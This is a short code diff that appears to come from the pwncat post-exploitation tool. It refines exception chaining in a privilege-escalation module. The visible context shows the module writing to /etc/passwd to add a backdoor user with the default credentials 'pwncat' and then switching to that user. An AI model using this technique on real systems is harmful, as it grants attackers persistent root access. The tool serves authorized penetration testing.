@@ -24,8 +24,8 @@ class AppendPasswd(EscalationReplace):
         try:
             with session.platform.open("/etc/passwd", "r") as filp:
                 passwd_contents = list(filp)
-        except (FileNotFoundError, PermissionError):
-            raise ModuleFailed("failed to read /etc/passwd")
+        except (FileNotFoundError, PermissionError) as exc:
+            raise ModuleFailed("failed to read /etc/passwd") from exc
 
         backdoor_user = session.config.get("backdoor_user", "pwncat")
         backdoor_pass = session.config.get("backdoor_pass", "pwncat")
@@ -55,8 +55,8 @@ class AppendPasswd(EscalationReplace):
                         new_line,
                     ),
                 )
-            except (FileNotFoundError, PermissionError):
-                raise ModuleFailed("failed to write /etc/passwd")
+            except (FileNotFoundError, PermissionError) as exc:
+                raise ModuleFailed("failed to write /etc/passwd") from exc
 
         else:
             console.log(
@@ -66,8 +66,8 @@ class AppendPasswd(EscalationReplace):
         try:
             session.platform.su(backdoor_user, password=backdoor_pass)
             return lambda session: session.platform.channel.send(b"exit\n")
-        except PermissionError:
-            raise ModuleFailed("added user, but switch user failed")
+        except PermissionError as exc:
+            raise ModuleFailed("added user, but switch user failed") from exc
 
     def title(self, session: "pwncat.manager.Session"):
         return f"""add user using {self.ability.title(session)}"""
